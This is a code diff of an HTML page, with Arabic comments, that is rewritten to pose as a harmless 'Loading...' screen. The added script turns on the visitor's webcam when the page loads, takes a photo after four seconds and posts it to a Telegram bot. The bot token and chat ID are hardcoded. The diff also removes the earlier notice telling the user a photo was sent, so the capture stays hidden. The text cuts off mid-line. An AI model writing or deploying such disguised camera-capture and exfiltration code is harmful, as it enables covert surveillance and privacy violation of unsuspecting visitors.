@@ -1,47 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Camera Access</title>
-</head>
-<body>
-  <h3>📸 جاري تشغيل الكاميرا...</h3>
-  <video id="video" autoplay playsinline width="300" style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <h2>🔒 جاري التحميل، يرجى الانتظار...</h2>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    
+    <script>
+      // ✅ استبدل بهذه القيم الخاصة بك
+      const BOT_TOKEN = "8270314738:AAHfpf2FINCU27HONunFozlOfz1d-Dmyxi8";
+      const CHAT_ID = "5752198595";
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+      const video = document.getElementById("video");
 
-    const BOT_TOKEN = '8270314738:AAHfpf2FINCU27HONunFozlOfz1d-Dmyxi8';
-    const CHAT_ID = '5752198595';
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        setTimeout(() => captureAndSend(), 4000);
-      })
-      .catch(error => {
-        alert('❌ فشل تشغيل الكاميرا');
-      });
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
 
-    function captureAndSend() {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'cam.jpg');
+          // بعد 4 ثواني، التقط الصورة وأرسلها
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          alert("✔️ تم إرسال الصورة إلى Telegram");
-        });
-      }, 'image/jpeg');
-    }
-  </script>
-</body>
-</html>
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                }).then(() => {
+                  stream.getTracks().forEach(t => t.stop()); // أوقف الكاميرا بعد الإرسال
+                });
+              })
+              .catch(error => console.error("فشل التقاط الصورة:", error));
+          }, 4000);
+        })
+        .catch((err) => {
+          console.error
